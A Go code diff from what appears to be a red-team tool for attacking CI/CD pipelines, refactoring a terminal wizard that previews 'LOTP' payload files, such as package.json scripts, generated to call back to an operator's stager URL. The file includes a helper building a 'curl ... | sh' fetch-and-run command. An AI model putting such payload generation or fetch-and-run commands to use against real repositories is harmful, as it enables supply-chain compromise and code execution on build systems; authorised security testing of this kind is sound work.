@@ -15,6 +15,7 @@ import (
 
 	"github.com/boostsecurityio/smokedmeat/internal/buildinfo"
 	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
+	"github.com/boostsecurityio/smokedmeat/internal/lotp"
 	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
 )
 
@@ -2011,7 +2012,10 @@ func (m *Model) buildWizardStep3Content(width int) []string {
 		lines = append(lines, m.buildWizardStep3LOTP(width)...)
 	}
 	// Skip payload summary for methods that already show it above
-	if m.wizard.Payload != "" && m.wizard.DeliveryMethod != DeliveryCopyOnly && m.wizard.DeliveryMethod != DeliveryManualSteps {
+	if m.wizard.Payload != "" &&
+		m.wizard.DeliveryMethod != DeliveryCopyOnly &&
+		m.wizard.DeliveryMethod != DeliveryManualSteps &&
+		m.wizard.DeliveryMethod != DeliveryLOTP {
 		payload := m.wizard.Payload
 		if len(payload) > innerWidth-20 {
 			payload = payload[:innerWidth-23] + "..."
@@ -2236,13 +2240,8 @@ func (m *Model) buildWizardStep3LOTP(width int) []string {
 		targets = m.wizard.SelectedVuln.LOTPTargets
 	}
 
-	callbackURL := stagerurl.Join(m.config.ExternalURL(), "<stager-id>")
-	previewLines := lotpPreviewLines(tool, callbackURL, m.wizard.PayloadPreview, len(targets) > 0)
-
-	payloadFile := "package.json"
-	if len(targets) > 0 {
-		payloadFile = targets[0]
-	}
+	callbackURL := stagerurl.Join(m.config.ExternalURL(), "preview-stager-id")
+	payloadFile, previewLines, extraFiles := lotpPreview(tool, callbackURL, targets, m.wizard.PayloadPreview)
 
 	boxPad := pad
 	boxPadWidth := lipgloss.Width(boxPad)
@@ -2254,8 +2253,8 @@ func (m *Model) buildWizardStep3LOTP(width int) []string {
 
 	lines = append(lines, formatWizardContent(pad, "", mutedColor.Render("Preview:"), innerWidth))
 	lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, innerWidth, payloadFile, previewLines)...)
-	if len(targets) > 1 {
-		lines = append(lines, formatWizardContent(pad, "", mutedColor.Render(fmt.Sprintf("+%d more target file(s)", len(targets)-1)), innerWidth))
+	if extraFiles > 0 {
+		lines = append(lines, formatWizardContent(pad, "", mutedColor.Render(fmt.Sprintf("+%d more file(s)", extraFiles)), innerWidth))
 	}
 
 	return lines
@@ -2301,19 +2300,77 @@ func renderPreviewBoxContent(maxWidth int, contentLines []string) string {
 	return previewStyle.Width(maxWidth).Render(strings.Join(truncated, "\n"))
 }
 
+func lotpPreview(tool, callbackURL string, targets []string, payloadPreview string) (payloadFile string, previewLines []string, extraFiles int) {
+	if payloadPreview != "" {
+		payloadFile = "package.json"
+		if len(targets) > 0 {
+			payloadFile = targets[0]
+		}
+		extraFiles = 0
+		if len(targets) > 1 {
+			extraFiles = len(targets) - 1
+		}
+		return payloadFile, summarizePreviewContent(payloadFile, payloadPreview), extraFiles
+	}
+
+	files := lotp.GenerateFiles(tool, targets, callbackURL)
+	if len(files) > 0 {
+		return files[0].Path, summarizePreviewContent(files[0].Path, files[0].Content), len(files) - 1
+	}
+
+	payloadFile = "package.json"
+	if len(targets) > 0 {
+		payloadFile = targets[0]
+	}
+	extraFiles = 0
+	if len(targets) > 1 {
+		extraFiles = len(targets) - 1
+	}
+	return payloadFile, lotpFallbackPreviewLines(tool, callbackURL, len(targets) > 0), extraFiles
+}
+
+func summarizePreviewContent(filename, content string) []string {
+	trimmed := strings.TrimRight(content, "\n")
+	if trimmed == "" {
+		return []string{""}
+	}
+
+	lines := strings.Split(trimmed, "\n")
+	if filename == "package.json" && len(lines) > 5 {
+		if summarized := summarizePackageJSONPreview(lines); len(summarized) > 0 {
+			return summarized
+		}
+	}
+	if len(lines) <= 8 {
+		return lines
+	}
+	return append(append(lines[:2], "..."), lines[len(lines)-2:]...)
+}
+
+func summarizePackageJSONPreview(lines []string) []string {
+	scriptsIdx := -1
+	for i, line := range lines {
+		if strings.Contains(line, `"scripts": {`) {
+			scriptsIdx = i
+			break
+		}
+	}
+	if scriptsIdx < 0 {
+		return nil
+	}
+
+	end := scriptsIdx + 3
+	if end > len(lines) {
+		end = len(lines)
+	}
+	return lines[scriptsIdx:end]
+}
+
 func lotpPreviewCurlPipeShCommand(callbackURL string) string {
 	return fmt.Sprintf("curl -s '%s' | sh", strings.ReplaceAll(callbackURL, "'", "'\"'\"'"))
 }
 
-func lotpPreviewLines(tool, callbackURL, payloadPreview string, hasTargets bool) []string {
-	if payloadPreview != "" {
-		lines := strings.Split(payloadPreview, "\n")
-		if len(lines) <= 5 {
-			return lines
-		}
-		return append(append(lines[:2], "..."), lines[len(lines)-2:]...)
-	}
-
+func lotpFallbackPreviewLines(tool, callbackURL string, hasTargets bool) []string {
 	curlCmd := lotpPreviewCurlPipeShCommand(callbackURL)
 	switch tool {
 	case "bash", "powershell", "python":
